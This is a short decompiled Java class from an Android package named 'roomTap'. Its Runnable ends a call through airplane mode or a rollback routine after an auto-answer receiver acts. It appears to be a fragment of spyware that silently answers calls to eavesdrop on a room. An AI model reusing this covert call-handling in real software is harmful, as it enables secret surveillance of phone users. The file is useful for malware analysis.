package com.network.android.roomTap;

import android.content.Context;
import com.network.android.c.a.a;

/* access modifiers changed from: package-private */
public final class e implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f118a;

    e(Context context) {
        this.f118a = context;
    }

    public final void run() {
        if (AutoAnswerReceiver.c) {
            a.a("Disconnect calling disconnectWithAireplaneMode");
            AutoAnswerReceiver.h();
            return;
        }
        a.a("Disconnect phone is not ofhook, calling roleBack...");
        AutoAnswerReceiver.e(this.f118a);
    }
}
